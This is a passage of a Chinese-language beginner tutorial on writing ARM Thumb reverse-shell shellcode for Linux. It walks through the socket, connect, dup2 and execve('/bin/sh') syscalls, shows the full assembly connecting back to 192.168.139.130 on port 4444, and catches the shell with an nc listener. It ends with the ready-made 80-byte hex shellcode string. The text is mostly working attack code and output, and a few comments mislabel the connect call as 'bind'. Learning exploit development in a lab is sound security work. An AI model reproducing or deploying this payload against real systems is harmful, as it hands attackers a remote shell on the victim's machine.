        mov r0, #2
        mov r1, #1
        sub r2, r2
        mov r7, #200
        add r7, #81 // r7 = 281 (socket syscall number) 
        svc #1 // r0 = sockid value 
        mov r4, r0 // save sockid in r4
## 2 - Connect
使用第一条指令，我们将存储在文字池中的结构对象（包含地址族，主机端口和主机地址）的地址放入R0。
文字池是存储常量，字符串或偏移量的同一部分中的内存区域（因为文字池是代码的一部分）。 你可以使用带标签的ADR指令，而不是手动计算pc相对偏移量。
ADR接受PC相对表达式，即带有可选偏移量的标签，其中标签的地址相对于PC标签。 像这样：
    // connect(r0, &sockaddr, 16)
     adr r1, struct // pointer to struct
     [...]
    struct:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 192,168,139,130 // IP Address
在第一条指令中，我们将R1指向存储区域，在该区域中存储地址族AF_INET，我们要使用的本地端口和IP地址的值。 STRB指令用x00替换\ x02 \
xff中的占位符xff，将AF_INET设置为\ x02 \ x00。  
STRB指令将一个字节从寄存器存储到计算的存储区域。 语法[r1，＃1]表示我们将R1作为基址，将立即值（＃1）作为偏移量。
我们怎么知道它是一个空字节存储？ 因为r2仅包含0，因为“sub r2，r2，r2”指令清除了寄存器。  
move指令将sockaddr结构的长度（AF_INET为2个字节，PORT为2个字节，ipaddress为4个字节，8个字节填充= 16个字节）放入r2。
然后，我们通过简单地向它添加2来将r7设置为283，因为r7已经包含来自上一次系统调用的281。
    // connect(r0, &sockaddr, 16)
     adr r1, struct // pointer to struct
     strb r2, [r1, #1] // write 0 for AF_INET
     mov r2, #16 // struct length
     add r7, #2 // r7 = 281+2 = 283 (bind syscall number) 
     svc #1
## 3 – STDIN, STDOUT, STDERR
对于dup2函数，我们需要系统调用号63.保存的sockid需要再次移入r0，子指令将r1设置为0.对于剩余的两个dup2调用，我们只需要更改r1并将r0重置为每个系统调用后的sockid。
    /* dup2(sockid, 0) */
        mov r7, #63 // r7 = 63 (dup2 syscall number) 
        mov r0, r4 // r4 is the saved client_sockid 
        sub r1, r1 // r1 = 0 (stdin) 
        svc #1
    /* dup2(sockid, 1) */
        mov r0, r4 // r4 is the saved client_sockid 
        add r1, #1 // r1 = 1 (stdout) 
        svc #1
    /* dup2(sockid, 2) */
        mov r0, r4 // r4 is the saved client_sockid
        add r1, #1 // r1 = 1+1 (stderr) 
        svc #1
## 4 - 生成一个shell
    // execve("/bin/sh", 0, 0) 
     adr r0, binsh // r0 = location of "/bin/shX"
     sub r1, r1 // clear register r1. R1 = 0
     sub r2, r2 // clear register r2. R2 = 0
     strb r2, [r0, #7] // replace X with 0 in /bin/shX
     mov r7, #11 // execve syscall number
     svc #1
     nop // nop needed for alignment
我们在这个例子中使用的execve()函数与编写ARM Shellcode教程的过程是相同的，其中所有内容都是逐步解释的。  
最后，我们将值AF_INET（带有0xff，将被替换为null），端口号，IP地址和“/bin/shX”（带有X，将被null替换）字符串放在我们的汇编代码的最后。
    struct_addr:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 192,168,139,130 // IP Address 
    binsh:
    .ascii "/bin/shX"
# 完整代码
这是我们的最终绑定shellcode的样子。
    .section .text
    .global _start
    _start:
     .ARM
     add r3, pc, #1 // switch to thumb mode 
     bx r3
    .THUMB
    // socket(2, 1, 0) 
     mov r0, #2
     mov r1, #1
     sub r2, r2
     mov r7, #200
     add r7, #81 // r7 = 281 (socket) 
     svc #1 // r0 = resultant sockfd 
     mov r4, r0 // save sockfd in r4 
    // connect(r0, &sockaddr, 16) 
     adr r1, struct // pointer to address, port 
     strb r2, [r1, #1] // write 0 for AF_INET 
     mov r2, #16
     add r7, #2 // r7 = 283 (connect) 
     svc #1
    // dup2(sockfd, 0) 
     mov r7, #63 // r7 = 63 (dup2) 
     mov r0, r4 // r4 is the saved sockfd 
     sub r1, r1 // r1 = 0 (stdin) 
     svc #1
    // dup2(sockfd, 1) 
     mov r0, r4 // r4 is the saved sockfd 
     mov r1, #1 // r1 = 1 (stdout) 
     svc #1
    // dup2(sockfd, 2) 
     mov r0, r4 // r4 is the saved sockfd 
     mov r1, #2 // r1 = 2 (stderr)
     svc #1
    // execve("/bin/sh", 0, 0) 
     adr r0, binsh
     sub r2, r2
     sub r1, r1
     strb r2, [r0, #7]
     mov r7, #11 // r7 = 11 (execve) 
     svc #1
    struct:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 192,168,139,130 // IP Address 
    binsh:
    .ascii "/bin/shX"
# 测试SHELLCODE
将汇编代码保存到名为reverse_shell.s的文件中。 使用ld时不要忘记-N标志。
这样做是因为我们要使用多个strb操作来修改我们的代码段（.text）。 这要求代码段是可写的，并且可以通过在链接过程中添加-N标志来实现。
    pi@raspberrypi:~/reverseshell $ as reverse_shell.s -o reverse_shell.o && ld -N reverse_shell.o -o reverse_shell
    pi@raspberrypi:~/reverseshell $ ./reverse_shell
然后，连接到指定的端口：
    user@ubuntu:~$ nc -lvp 4444
    Listening on [0.0.0.0] (family 0, port 4444)
    Connection from [192.168.139.130] port 4444 [tcp/*] accepted (family 2, sport 38020)
    uname -a
    Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l GNU/Linux
成功了！ 现在让我们使用以下命令将其转换为十六进制字符串：
    pi@raspberrypi:~/reverseshell $ objcopy -O binary reverse_shell reverse_shell.bin
    pi@raspberrypi:~/reverseshell $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' reverse_shell.bin
    \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x52\x40\x49\x40\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\x8b\x82\x2f\x62\x69\x6e\x2f\x73\x68\x58
瞧！这就是反向shellcode！ 这个shellcode长80个字节。 由于这是一个初学者教程，为了保持简单，shellcode并不是那么简短。
在初步完成shellcode之后，你可以尝试找到减少指令量的方法，从而缩短shellcode。  
希望你能学到一些东西，可以运用这些知识来编写你自己的变种shellcode。 请随时与我联系以获得反馈或建议。